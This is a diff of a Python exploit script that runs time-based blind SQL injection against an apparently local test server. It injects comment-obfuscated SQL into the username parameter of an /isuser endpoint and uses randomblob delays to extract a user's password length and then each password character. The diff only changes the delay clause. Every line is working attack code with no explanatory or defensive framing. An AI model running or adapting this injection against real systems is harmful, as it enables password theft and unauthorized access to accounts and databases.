@@ -5,7 +5,7 @@ usr = "alex"
 oldtime = 1000
 
 for i in range(1, 11):
-    url = "http://localhost:5000/isuser?username=" + usr + "'/**/and/**/length(password)=" + str(i) + "/**/and/**/1=randomblob(1000000000)--"
+    url = "http://localhost:5000/isuser?username=" + usr + "'/**/and/**/length(password)=" + str(i) + "/**/and/**/hex(substr(password, 1, 1))=randomblob(1000000000)--"
     currtime = time.time()
     resp  = requests.get(url)
     comptime = time.time() - currtime
@@ -27,7 +27,7 @@ oldtime = 100000
 for pswind in range(1,passlen+1):
     for i in range(256):
         c = chr(i)
-        url = "http://localhost:5000/isuser?username=" + usr + "'/**/and/**/hex(substr(password," + str(pswind) + ",1))=hex('" + c + "')/**/and/**/1=randomblob(1000000000)--"
+        url = "http://localhost:5000/isuser?username=" + usr + "'/**/and/**/hex(substr(password," + str(pswind) + ",1))=hex('" + c + "')/**/and/**/hex(substr(password, 1, 1))=randomblob(1000000000)--"
         #print(url)
         currtime = time.time()
         resp  = requests.get(url)
